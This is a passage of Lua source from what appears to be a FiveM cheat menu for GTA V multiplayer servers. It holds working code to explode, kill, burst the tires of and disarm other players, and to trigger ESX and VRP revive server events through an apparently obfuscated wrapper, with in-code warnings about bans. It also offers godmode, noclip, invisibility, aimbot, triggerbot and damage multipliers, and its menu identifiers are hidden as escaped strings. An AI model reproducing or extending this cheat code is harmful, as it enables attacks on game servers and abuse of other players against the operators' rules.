                    elseif Ciao.ComboBox("Pop Tire", {"Front Left", "Front Right", "Back Left", "Back Right", "All"}, currTireIndex, selTireIndex, function(currentIndex, selClothingIndex)
                            currTireIndex = currentIndex
                            selTireIndex = currentIndex
                            end) then
                            if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
                                ShowInfo("~r~The guy is not in the car?")
                            else

                                local wasSpeccing= arwet
                                local tmp = nname
                                if Spectating then
                                    tmp = SpectatedPlayer
                                    wasSpeccing = true
                                    Spectating = not Spectating
                                    SpectatePlayer(tmp)
                                end

                                local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
                                RequestControlOnce(veh)
                                if selTireIndex == 1 then
                                    SetVehicleTyreBurst(veh, 0, 1, 1000.0)
                                elseif selTireIndex == 2 then
                                    SetVehicleTyreBurst(veh, 1, 1, 1000.0)
                                elseif selTireIndex == 3 then
                                    SetVehicleTyreBurst(veh, 4, 1, 1000.0)
                                elseif selTireIndex == 4 then
                                    SetVehicleTyreBurst(veh, 5, 1, 1000.0)
                                elseif selTireIndex == 5 then
                                    for i=0,7 do
                                        SetVehicleTyreBurst(veh, i, 1, 1000.0)
                                    end
                                end

                                if wasSpeccing then
                                    Spectating = not Spectating
                                    SpectatePlayer(tmp)
                                end

                            end
                    elseif Ciao.Button("~r~Explode Player!") then
                        ExplodePlayer(selectedPlayer)
                    elseif Ciao.Button("~r~Kill Player!") then
                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        AddExplosion(coords.x, coords.y, coords.z, 4, 0.1, 0, 1, 0.0)
                    elseif Ciao.Button("Kick Player from car") then
                        KickFromVeh(selectedPlayer)
                        end


                -- SPECIFIC PLAYER OPTIONS
                elseif Ciao.IsMenuOpened('\112\108\97\121\101\114\111\112\116\105\111\110\115\10') then
                    if Ciao.Button("~m~PLAYER: " .. "~g~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" ..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), GetPlayerName(selectedPlayer))then
                    elseif Ciao.CheckBox("~g~Spectate ~s~Player", Spectating, "Spectating: ~m~OFF", "Spectating: "..GetPlayerName(SpectatedPlayer)) then
                        Spectating = not Spectating
                        SpectatePlayer(selectedPlayer)
                        SpectatedPlayer = selectedPlayer
                    elseif Ciao.MenuButton("Troll Menu", 'troll') then
                
                    elseif Ciao.Button("~r~Revive You self on [ESX Server]") then
                        local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
                    if string.lower(confirm) == "y" then
                            udwdj("whoapd:revive", GetPlayerServerId(selectedPlayer))
                            udwdj("paramedic:revive", GetPlayerServerId(selectedPlayer))
                            udwdj("ems:revive", GetPlayerServerId(selectedPlayer))
                            TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(selectedPlayer))
                            udwdj('esx_ambulancejob:revive', GetPlayerServerId(selectedPlayer))
                            udwdj('esx_ambulancejob:setDeathStatus', arwet)
                            StopScreenEffect('DeathFailOut')
                            DoScreenFadeIn(800)
                    else
                            ShowInfoa("~r~Operation Canceled")
                        end
                    elseif Ciao.Button("~g~Copy ~s~Skin Player ~r~(New)") then
                        ClonePed(selectedPlayer)
                ShowInfo("~g~Skin Copied!")
                    elseif Ciao.Button('~b~VRP ~s~Revive') then
                            local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                            CreateAmbientPickup(GetHashKey('PICKUP_HEALTH_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_HEALTH_STANDARD'), 1, 0)
                            SetPickupRegenerationTime(pickup, 60)
                    elseif Ciao.Button('~b~Armour ~s~Spiller') then
                            local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                            local pickup = CreateAmbientPickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_ARMOUR_STANDARD'), 1, 0)
                            SetPickupRegenerationTime(pickup, 60)
                    elseif Ciao.Button('~b~Fuld Armour ~s~Spiller') then
                            local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                            for i = 0, 99 do
                                Citizen.Wait(0)
                                CreateAmbientPickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_ARMOUR_STANDARD'), 1, 0)
                                SetPickupRegenerationTime(pickup, 10)
                                i = i + 1
                            end
                        elseif Ciao.Button("Teleport To Player") then
                            local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
                            if string.lower(confirm) == "y" then
                                TeleportToPlayer(selectedPlayer)
                            else
                                ShowInfo("~r~Operation Canceled")
                            end
                    elseif Ciao.ComboBox("Teleport in the car", {"Front Right", "Back Left", "Back Right"}, currSeatIndex, selSeatIndex, function(currentIndex, selClothingIndex)
                            currSeatIndex = currentIndex
                            selSeatIndex = currentIndex
                            end) then
                            if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
                                ShowInfo("~r~Player Not In Vehicle!")
                            else
                                local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
                                if string.lower(confirm) == "y" then
                                    local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
                                    if selSeatIndex == 1 then
                                        if IsVehicleSeatFree(veh, 0) then
                                            SetPedIntoVehicle(PlayerPedId(), veh, 0)
                                        else
                                            ShowInfo("~r~Seat Taken Or Does Not Exist!")
                                        end
                                        
                                    elseif selSeatIndex == 2 then
                                        if IsVehicleSeatFree(veh, 1) then
                                            SetPedIntoVehicle(PlayerPedId(), veh, 1)
                                        else
                                            ShowInfo("~r~Seat Taken Or Does Not Exist!")--aww
                                        end
                                    elseif selSeatIndex == 3 then
                                        if IsVehicleSeatFree(veh, 2) then
                                            SetPedIntoVehicle(PlayerPedId(), veh, 2)
                                        else
                                            ShowInfo("~r~Seat Taken Or Does Not Exist!")
                                        end
                                    end
                                end
                            end
                    elseif Ciao.Button("Cancel Animation/Task") then
                        ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
                    elseif Ciao.Button("Give Him all Weapons") then
                    GiveAllWeapons(selectedPlayer)
                    elseif Ciao.Button("Remove All weapons") then
                        StripPlayer(selectedPlayer)
                    end


                -- SELF OPTIONS MENU
                elseif Ciao.IsMenuOpened('\115\101\108\102\10') then
                    if Ciao.CheckBox("~r~God~b~mode", Godmode) then
                        Godmode = not Godmode
                        ToggleGodmode(Godmode)
                    elseif Ciao.CheckBox("~b~Demigod Mode~g", Demigod) then
                        Demigod = not Demigod
                    elseif Ciao.Button("~y~Randomize ~s~Skins") then
                        RandomClothes(PlayerId())
                    elseif Ciao.CheckBox("Infinite Stamina", InfStamina) then
                        InfStamina = not InfStamina
                    elseif Ciao.Button("ESX Revive") then
                        local confirm = GetKeyboardInput("You will maybe  ~r~Get banned! ~s~Are you sure? ~g~Y~w~/~r~N")
                    if string.lower(confirm) == "y" then
                        TriggerEvent("esx_status:set", "hunger", 1000000)
                        TriggerEvent("esx_status:set", "thirst", 1000000)
                        TriggerEvent("esx_ambulancejob:revive")
                        TriggerEvent('ambulancier:selfRespawn')
                    else
                            ShowInfo("~r~Operation Canceled")
                        end
                    elseif Ciao.Button('ESX ~r~Revive "Friend" ') then
                        local f = KeyboardInput('Enter Player ID or all', '', 1000)
                        if f then
                            if f == 'all' then
                                for i = 0, 128 do
                                    TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(i))
                                    TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(i))
                                end
                            else
                                TriggerEvent('esx_ambulancejob:revive', f)
                                TriggerEvent('esx_ambulancejob:revive', f)
                            end
                        end
                    elseif Ciao.ComboBox("~b~Player ~s~Functions ~y~Â»", {"~b~VRP ~s~Revive you self", "~b~Give you self Armour", "~y~Remove Armour", "~g~Be clean", "~y~Suicide", "~y~Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
                        currPFuncIndex = currentIndex
                        selPFuncIndex = currentIndex
                        end) then
                        if selPFuncIndex == 1 then
                            SetEntityHealth(PlayerPedId(), 200)
                        elseif selPFuncIndex == 2 then
                            SetPedArmour(PlayerPedId(), 100)
                        elseif selPFuncIndex == 3 then
                            SetPedArmour(PlayerPedId(), 0)
                        elseif selPFuncIndex == 4 then
                            ClearPedBloodDamage(PlayerPedId())
                            ClearPedWetness(PlayerPedId())
                            ClearPedEnvDirt(PlayerPedId())
                            ResetPedVisibleDamage(PlayerPedId())
                        elseif selPFuncIndex == 5 then
                            SetEntityHealth(PlayerPedId(), 0)
                        elseif selPFuncIndex == 6 then
                            ClearPedTasksImmediately(PlayerPedId())
                        end
                    elseif Ciao.ComboBoxSlider("~y~Fast Run", FastCBWords, currFastRunIndex, selFastRunIndex, function(currentIndex, selClothingIndex)
                        currFastRunIndex = currentIndex
                        selFastRunIndex = currentIndex
                        FastRunMultiplier = FastCB[currentIndex]
                        SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
                        end) then
                    elseif Ciao.ComboBoxSlider("~y~Fast Swim", FastCBWords, currFastSwimIndex, selFastSwimIndex, function(currentIndex, selClothingIndex)
                        currFastSwimIndex = currentIndex
                        selFastSwimIndex = currentIndex
                        FastSwimMultiplier = FastCB[currentIndex]
                        SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
                        end) then
                    elseif Ciao.CheckBox("Super Jump", SuperJump) then
                        SuperJump = not SuperJump
                    elseif Ciao.CheckBox("Invisibility", Invisibility) then
                        Invisibility = not Invisibility
                        if not Invisibility then
                            SetEntityVisible(PlayerPedId(), true)
                        end
                    elseif Ciao.CheckBox("~m~Magneto Mode ~s~KEY ~y~[E]", ForceTog) then
                        ForceMod()
                    
                    elseif Ciao.CheckBox("~m~Noclip", Noclipping) then
                        ToggleNoclip()
                    elseif Ciao.ComboBox("~c~Noclip Speed ~y~Â»", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex)
                            currNoclipSpeedIndex = currentIndex
                            selNoclipSpeedIndex = currentIndex
                            NoclipSpeed = NoclipSpeedOps[currNoclipSpeedIndex]
                            end) then
                    end


                -- APPEARANCE MENU
                elseif Ciao.IsMenuOpened('\97\112\112\101\97\114\97\110\99\101\10') then
                if Ciao.MenuButton("Models", 'skinsmodels') then
                    elseif Ciao.Button("Set Model Name") then
                        local model = GetKeyboardInput("Enter Model Name:")
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                        else ShowInfo("~r~Model not recognized (Try Again)") end
                    elseif Ciao.MenuButton("Modify Skin Textures", 'modifyskintextures') then
                    elseif Ciao.Button("~b~Randomize ~s~Model") then
                        RandomClothes(PlayerId())
                    elseif Ciao.ComboBox("Save Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                        currClothingIndex = currentIndex
                        selClothingIndex = currentIndex
                    end) then
                        Outfits[selClothingIndex] = GetCurrentOutfit(PlayerId())
                    elseif Ciao.ComboBox("Load Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                        currClothingIndex = currentIndex
                        selClothingIndex = currentIndex
                    end) then
                        SetCurrentOutfit(Outfits[selClothingIndex])
                    end

                    -- MODIFY SKIN TEXTURES MENU
                        -- Useful methods to retrieve max number of clothes/colors for each body part index
                        -- http://gtaxscripting.blogspot.com/2016/04/gta-v-peds-component-and-props.html
                    elseif Ciao.IsMenuOpened('modifyskintextures') then
                        --" ..tostring(GetNumberOfPedDrawableVariations(PlayerPedId(), 0)).. " Variations)" -- Removed this part for now

                        ----------------------------------------------------------------------
                        -- The values of currSomethingIndex and selSomethingIndex need to   --
                        -- be assigned to the drawables/textures the ped is currently using --
                        -- so it doesn't reset them (before opening any of the menus)       --
                        ----------------------------------------------------------------------



                        if Ciao.MenuButton("Head", "modifyhead") then

                            if GetEntityModel(PlayerPedId()) ~= GetHashKey("mp_m_freemode_01") then
                                Ciao.CloseMenu()
                                Ciao.OpenMenu('modifyskintextures')
                                ShowInfo("~r~Only MP Models Supported For Now!")
                            end

                            faceItemsList = GetHeadItems()
                            faceTexturesList = GetHeadTextures(GetPedDrawableVariation(PlayerPedId(), 0))
                            hairItemsList = GetHairItems()
                            hairTexturesList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))
                            maskItemsList = GetMaskItems()
                            hatItemsList = GetHatItems()
                            hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0))
                        end

                        elseif Ciao.IsMenuOpened('skinsmodels') then

        if Ciao.Button("~g~Reset Model To FiveM Player") then
                    local model = "mp_m_freemode_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
        

            elseif Ciao.Button("Change To ~p~Clown") then
                    local model = "s_m_y_clown_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                        elseif Ciao.Button("Change To Dog") then
                            local model = "CSB_BallasOG"
                                RequestModel(GetHashKey(model))
                                Wait(500)
                                if HasModelLoaded(GetHashKey(model)) then
                                    SetPlayerModel(PlayerId(), GetHashKey(model))
                                end
                            elseif Ciao.Button("Change To A Kid Working On [DEVO FILES]") then
                                local model = "a_f_y_tourist_02"
                                    RequestModel(GetHashKey(model))
                                    Wait(500)
                                    if HasModelLoaded(GetHashKey(model)) then
                                        SetPlayerModel(PlayerId(), GetHashKey(model))
                                    end
                                elseif Ciao.Button("Change To A Kid 2 Working On [DEVO FILES]") then
                                    local model = "a_f_y_tourist_01"
                                        RequestModel(GetHashKey(model))
                                        Wait(500)
                                        if HasModelLoaded(GetHashKey(model)) then
                                            SetPlayerModel(PlayerId(), GetHashKey(model))
                                        end
                    elseif Ciao.Button("Change To ~r~Stripper") then
                    local model = "s_f_y_stripper_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif Ciao.Button("Change To ~b~Cop") then
                    local model = "s_m_y_cop_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif Ciao.Button("Change To ~o~Chimp") then
                    local model = "local peds4_chimp"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif Ciao.Button("Change To ~g~Alien") then
                    local model = "s_m_m_movalien_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif Ciao.Button("Change To ~p~Pongo") then
                    local model = "u_m_y_pogo_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif Ciao.Button("Change To ~o~Babyd") then
                    local model = "u_m_y_babyd"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                        end
                    end

                        -- Head Menu
                        elseif Ciao.IsMenuOpened('modifyhead') then
                            if Ciao.ComboBoxSlider("Face", faceItemsList, currFaceIndex, selFaceIndex, function(currentIndex, selectedIndex)
                                currFaceIndex = currentIndex
                                selFaceIndex = currentIndex
                                SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[currentIndex]-1, 0, 0)
                                faceTexturesList = GetHeadTextures(faceItemsList[currentIndex]-1)
                                end) then
                                --[[ -- I dont think any MP faces have textures?
                            elseif Ciao.ComboBox2("Face Texture", faceTexturesList, currFtextureIndex, selFtextureIndex, function(currentIndex, selectedIndex)
                                currFtextureIndex = currentIndex
                                selFtextureIndex = currentIndex
                                SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[currFaceIndex]-1, faceTexturesList[currentIndex]-1, 0)
                            end) then
                                ]]
                            elseif Ciao.ComboBoxSlider("Hair", hairItemsList, currHairIndex, selHairIndex, function(currentIndex, selectedIndex)
                                previousHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))

                                previousHairTextureDisplay = hairTextureList[currHairTextureIndex]

                                currHairIndex = currentIndex
                                selHairIndex = currentIndex
                                SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currentIndex]-1, 0, 0)
                                currentHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
                                hairTextureList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))

                                if (currentKey == keys.left or currentKey == keys.right) and previousHairTexture > currentHairTexture and previousHairTextureDisplay > currentHairTexture then
                                    currHairTextureIndex = hairTexturesList[currentHairTexture]
                                    selHairTextureIndex = hairTexturesList[currentHairTexture]
                                end

                                end) then
                            elseif Ciao.ComboBox2("Hair Color", hairTextureList, currHairTextureIndex, selHairTextureIndex, function(currentIndex, selectedIndex)
                                currHairTextureIndex = currentIndex
                                selHairTextureIndex = currentIndex
                                SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currHairIndex]-1, currentIndex-1, 0)
                                end) then
                            elseif Ciao.ComboBoxSlider("Mask", maskItemsList, currMaskIndex, selMaskIndex, function(currentIndex, selectedIndex)
                                currMaskIndex = currentIndex
                                selMaskIndex = currentIndex
                                SetPedComponentVariation(PlayerPedId(), 1, maskItemsList[currentIndex]-1, 0, 0)
                                end) then
                            elseif Ciao.ComboBoxSlider("Hat", hatItemsList, currHatIndex, selHatIndex, function(currentIndex, selectedIndex)
                                previousHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props before the hat index and the prop updates (previous)

                                -- I wanted to grab hatTexturesList[currHatTextureIndex] before the the Prop was updated. This value is the number (index) that is shown on the Hat Texture ComboBox before it updates
                                previousHatTextureDisplay = hatTexturesList[currHatTextureIndex]

                                -- Both Hat Slider and Hat Texture ComboBox values update
                                currHatIndex = currentIndex
                                selHatIndex = currentIndex
                                SetPedPropIndex(PlayerPedId(), 0, hatItemsList[currentIndex]-1, 0, 0)
                                currentHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props after the hat index and the prop updates (current)
                                hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0)) -- Generates our array of indexes

                                -- This if condition will only run once for every hat change since the variables previousHatTexture and currentHatTexture will become the same after the SetPedPropIndex() function runs
                                if (currentKey == keys.left or currentKey == keys.right) and previousHatTexture > currentHatTexture and previousHatTextureDisplay > currentHatTexture then
                                    print('if condition')
                                    -- Checking if the left/right arrow key was pressed since this function runs every tick, to make sure it really only runs once

                                    -- Sets the current Index of the HatTexturesList to the max value of the currentHatTexture
                                    currHatTextureIndex = hatTexturesList[currentHatTexture]
                                    selHatTextureIndex = hatTexturesList[currentHatTexture]
                                end

                                end) then
                            elseif Ciao.ComboBox2("Hat Texture", hatTexturesList, currHatTextureIndex, selHatTextureIndex, function(currentIndex, selectedIndex)
                                currHatTextureIndex = currentIndex
                                selHatTextureIndex = currentIndex
                                SetPedPropIndex(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0), currentIndex, 0)
                                end) then

                            end


                        elseif Ciao.IsMenuOpened('WeaponCustomization') then
                            if Ciao.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
                            currPFuncIndex = currentIndex
                            selPFuncIndex = currentIndex
                            end) then
                            if selPFuncIndex == 1 then
                                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)

                            elseif selPFuncIndex == 2 then
                                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)

                            elseif selPFuncIndex == 3 then
                                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)

                            elseif selPFuncIndex == 4 then
                                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)

                            elseif selPFuncIndex == 5 then
                                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)

                            elseif selPFuncIndex == 6 then
                                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)

                            elseif selPFuncIndex == 7 then
                                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)

                            elseif selPFuncIndex == 8 then
                                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                            end
                        elseif Ciao.Button("~g~Add ~s~Special Finish") then
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                        elseif Ciao.Button("~r~Remove ~s~Special Finish") then
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                        elseif Ciao.Button("~g~Add ~s~Suppressor") then
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                        elseif Ciao.Button("~r~Remove ~s~Suppressor") then
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                        elseif Ciao.Button("~g~Add ~s~Scope") then
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                            GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                        elseif Ciao.Button("~r~Remove ~s~Scope") then
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                            RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                        end


                -- WEAPON OPTIONS MENU
                elseif Ciao.IsMenuOpened('\119\101\97\112\111\110\10') then
                    if Ciao.MenuButton("~g~Give ~s~Single Weapon", '\119\101\97\112\111\110\115\112\97\119\110\101\114\10') then
                        selectedPlayer = PlayerId()
                    elseif Ciao.MenuButton("Weapon Customization", "WeaponCustomization") then
                        selectedPlayer = PlayerId()
                    elseif Ciao.Button("Give All Weapons") then
                        GiveAllWeapons(PlayerId())
                    elseif Ciao.Button("Remove All Weapons") then
                        StripPlayer(PlayerId())
                    elseif Ciao.Button("Remove Ammo") then
                        SetPedAmmo(GetPlayerPed(-1), 0)
                    elseif Ciao.Button("Give Max Ammo") then
                        GiveMaxAmmo(PlayerId())
                    elseif Ciao.ComboBox(
                        "~h~Weapon/Melee Damage",
                        {"1x (Default)", "2x", "3x", "4x", "5x"},
                        currentItemIndex,
                        selectedItemIndex,
                        function(currentIndex, selectedIndex)
                            currentItemIndex = currentIndex
                            selectedItemIndex = selectedIndex
                            SetPlayerWeaponDamageModifier(PlayerId(), selectedItemIndex)
                            SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedItemIndex)
                            end)
                            then
                    elseif Ciao.CheckBox("Infinite Ammo", InfAmmo) then
                        InfAmmo = not InfAmmo
                        SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
                    elseif Ciao.CheckBox("Explosive Ammo", ExplosiveAmmo) then
                        ExplosiveAmmo = not ExplosiveAmmo
                    elseif Ciao.CheckBox("Force Gun", ForceGun) then
                        ForceGun = not ForceGun
                    elseif Ciao.CheckBox("Super Damage", SuperDamage) then
                        SuperDamage = not SuperDamage
                        if SuperDamage then
                            local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                            SetPlayerWeaponDamageModifier(PlayerId(), 200.0)
                        else
                            local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                            SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                        end
                    elseif Ciao.CheckBox("Rapid Fire", RapidFire) then
                        RapidFire = not RapidFire
                    elseif Ciao.CheckBox("Aimbot", Aimbot) then
                        Aimbot = not Aimbot
                    elseif Ciao.ComboBox("Aimbot Bone Target ~y~Â»", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
                        currAimbotBoneIndex = currentIndex
                        selAimbotBoneIndex = currentIndex
                        AimbotBone = NameToBone(AimbotBoneOps[currentIndex])
                    end) then
                        elseif Ciao.CheckBox("Draw Aimbot FOV", DrawFov) then
                        DrawFov = not DrawFov
                        elseif Ciao.CheckBox("Triggerbot", Triggerbot) then
                            Triggerbot = not Triggerbot
                        elseif Ciao.CheckBox("~u~Ragebot", Ragebot) then
